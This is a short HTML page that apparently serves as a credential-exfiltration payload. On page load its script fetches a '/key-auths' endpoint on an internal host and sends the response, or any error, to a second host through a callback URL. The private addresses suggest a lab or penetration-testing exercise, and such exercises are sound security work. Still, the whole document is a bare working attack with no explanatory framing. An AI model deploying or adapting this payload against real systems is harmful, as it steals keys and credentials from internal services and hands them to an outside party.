<html>
<head>
<script>
    function exfiltrate() {
        fetch("http://172.16.16.2:8001/key-auths")
        .then((response) => response.text())
        .then((data) => {
            document.getElementById("credentials").innerText = data;
            fetch("http://192.168.45.195/callback?" + encodeURIComponent(data));
        }).catch(err => {
            fetch("http://192.168.45.195/error?" + encodeURIComponent(err));
        }); 
    }
</script>
</head>
<body onload='exfiltrate()'>
<div id="credentials"></div>
</body>
</html>
